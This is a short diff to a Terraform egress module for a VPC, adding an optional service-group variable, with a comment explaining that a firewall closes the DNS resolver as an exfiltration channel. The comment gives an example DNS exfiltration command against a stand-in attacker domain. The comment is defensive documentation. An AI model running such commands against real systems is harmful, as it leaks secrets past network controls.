@@ -53,6 +53,10 @@ module "egress" {
   core_services  = ["sts", "logs", "kms", "glue", "lakeformation"]
   extra_services = ["sagemaker.api", "secretsmanager"]
 
+  # Per apply, from `make up ENV=production GROUPS=…` (variables.tf): `redshift` for a job that calls
+  # the governed warehouse's API from inside this VPC (Stage 9 step 9.1), nothing otherwise.
+  optional_service_groups = var.optional_service_groups
+
   # The firewall closes the VPC resolver as an exfiltration channel (6c step 5.7), which exists
   # wherever code runs, with or without a route: `dig secret-payload.evil.example` leaves through
   # the resolver one label at a time.
